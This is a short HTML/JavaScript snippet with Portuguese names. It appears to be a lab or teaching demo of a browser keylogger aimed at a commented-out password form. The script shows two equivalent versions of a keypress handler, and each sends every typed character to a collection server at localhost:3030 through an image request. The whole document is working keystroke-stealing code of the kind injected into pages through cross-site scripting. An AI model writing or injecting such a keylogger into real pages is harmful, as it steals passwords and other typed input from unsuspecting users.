/*<form action="/" method="post">
    <input type="text" name="senha">
</form>
*/
<script>
    document.onkeypress = function Logger(tecla){
        tecla_pressionada  = String.fromCharCode(tecla.which);
        new Image().src = "http://localhost:3030/?tecla=" + tecla_pressionada;
    }
    
    // OU

    document.addEventListener("keypress",(tecla)=>{
        tecla_pressionada  = String.fromCharCode(tecla.which);
        new Image().src = "http://localhost:3030/?tecla=" + tecla_pressionada;
    })
</script>